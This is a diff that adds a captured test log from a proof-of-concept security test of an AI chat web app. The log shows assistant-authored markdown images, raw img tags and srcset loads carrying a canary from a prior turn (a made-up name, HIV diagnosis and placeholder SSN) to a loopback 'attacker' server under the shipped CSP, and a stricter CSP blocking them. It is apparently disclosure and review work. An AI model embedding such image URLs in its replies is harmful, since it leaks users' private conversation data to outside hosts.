@@ -1,0 +1,51 @@
+# Captured 2026-10-11 from ./run.sh (tinfoil-webapp @ c061681, vitest 4.1.10 jsdom; Chromium headless shell via Playwright 1.63.0; loopback only)
+
+
+stdout | tests/poc/image-exfil.test.tsx > assistant message: markdown image, raw <img> and <picture><source srcset> survive as remote loads
+[poc] <img src>      : [
+  'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=markdown',
+  'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=raw-img',
+  'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=picture-fallback'
+]
+[poc] <source srcset>: [
+  'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=srcset'
+]
+[poc] <script>/<iframe> left in DOM: 0
+[poc] wrote /root/tinfoil-review/work/disclosures/06/out/rendered-message.html
+
+ ✓ tests/poc/image-exfil.test.tsx > assistant message: markdown image, raw <img> and <picture><source srcset> survive as remote loads 96ms
+stdout | tests/poc/image-exfil.test.tsx > negative control: an honest answer (no image syntax) and a data: image produce no remote load
+[poc] control remote URLs: []
+
+ ✓ tests/poc/image-exfil.test.tsx > negative control: an honest answer (no image syntax) and a data: image produce no remote load 13ms
+
+ Test Files  1 passed (1)
+      Tests  2 passed (2)
+
+
+=== shipped CSP: img-src = img-src 'self' data: blob: https:
+[attacker] GET /x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=markdown
+[attacker] GET /x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=raw-img
+[attacker] GET /x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023%2C%20SSN%20000-00-0000%22&via=srcset
+[csp-blocked] Loading the stylesheet 'https://127.0.0.1:48443/ctl?via=external-stylesheet' violates the following Content Se
+[csp-blocked] Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsa
+[csp-blocked] Framing 'https://127.0.0.1:48443/' violates the following Content Security Policy directive: "frame-src 'self'
+[csp-blocked] Connecting to 'https://127.0.0.1:48443/ctl?via=fetch' violates the following Content Security Policy directive
+[csp-blocked] Fetch API cannot load https://127.0.0.1:48443/ctl?via=fetch. Refused to connect because it violates the docume
+[poc] shipped CSP: 3 image request(s) carrying the canary reached the attacker; 0 control request(s) got through
+
+=== fixed CSP (control): img-src = img-src 'self' data: blob:
+[csp-blocked] Loading the stylesheet 'https://127.0.0.1:48443/ctl?via=external-stylesheet' violates the following Content Se
+[csp-blocked] Loading the image 'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023
+[csp-blocked] Loading the image 'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023
+[csp-blocked] Loading the image 'https://127.0.0.1:48443/x.png?d=CANARY%20prior-turn%3A%20%22Jane%20Roe%2C%20dx%20HIV%202023
+[csp-blocked] Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsa
+[csp-blocked] Framing 'https://127.0.0.1:48443/' violates the following Content Security Policy directive: "frame-src 'self'
+[csp-blocked] Connecting to 'https://127.0.0.1:48443/ctl?via=fetch' violates the following Content Security Policy directive
+[csp-blocked] Fetch API cannot load https://127.0.0.1:48443/ctl?via=fetch. Refused to connect because it violates the docume
+[poc] fixed CSP (control): 0 image request(s) carrying the canary reached the attacker; 0 control request(s) got through
+   leaked: CANARY prior-turn: "Jane Roe, dx HIV 2023, SSN 000-00-0000" | via markdown
+   leaked: CANARY prior-turn: "Jane Roe, dx HIV 2023, SSN 000-00-0000" | via raw-img
+   leaked: CANARY prior-turn: "Jane Roe, dx HIV 2023, SSN 000-00-0000" | via srcset
+
+RESULT: VULNERABLE (shipped CSP lets model-authored images exfiltrate; fixed CSP blocks them)
